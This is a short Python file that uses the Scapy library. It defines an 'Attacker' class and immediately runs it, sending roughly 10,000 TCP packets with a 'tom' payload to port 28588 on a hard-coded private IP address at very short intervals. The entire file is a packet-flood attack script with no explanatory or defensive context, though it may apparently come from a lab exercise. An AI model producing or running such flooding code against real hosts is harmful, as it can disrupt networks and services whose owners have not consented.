from scapy.all import *
from scapy.layers.inet import IP, TCP


class Attacker:
    def __init__(self, target_ip: str, packets_amount: int):
        self.target = target_ip
        self.amount = packets_amount

    def send_packets(self):
        i = 1
        while i < self.amount:
            IP1 = IP(dst=self.target)
            TCP1 = TCP(dport=28588) / Raw(load='tom')
            pkt = IP1 / TCP1
            send(pkt, inter=.0001)

            print("packet sent ", i, pkt[IP].src)
            i = i + 1


a = Attacker("192.168.1.13", 10000)
a.send_packets()


